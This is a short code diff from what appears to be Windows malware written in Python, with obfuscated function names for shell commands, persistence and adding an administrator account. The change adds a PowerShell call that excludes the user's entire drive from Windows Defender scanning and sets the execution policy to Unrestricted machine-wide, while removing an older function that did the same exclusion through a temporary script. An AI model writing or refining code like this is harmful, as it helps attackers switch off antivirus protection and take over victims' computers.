@@ -64,6 +64,8 @@ current_drive_letter = Path.home().drive
 
 
 def sh3ll_c0mm4nds():
+    run("powershell.exe Add-MpPreference -ExclusionPath " + current_drive_letter + "", shell=True)
+    sleep(0.1)
     run('powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force',
         shell=True)
     sleep(0.1)
@@ -146,19 +148,6 @@ def p3rs1st3nc3():
 
 # _Fix_With_An_If_OS.PATH_Exists
 p3rs1st3nc3()
-
-
-def w1nd0ws_d3f3nder_ki11():
-    with open("C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\p0wersh3ll_scr1pts\\main.ps1",
-              'w') as f:
-        f.write("Add-MpPreference -ExclusionPath " + current_drive_letter + "")
-        sleep(0.1)
-        f.close()
-        sleep(0.1)
-    run("powershell.exe Start-Job -FilePath C:\\Users\\" + CURRENT_USER + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\p0wersh3ll_scr1pts\\main.ps1")
-
-
-w1nd0ws_d3f3nder_ki11()
 
 
 def create_new_usr():  # _Adds_A_New_Administrator_To_The_System
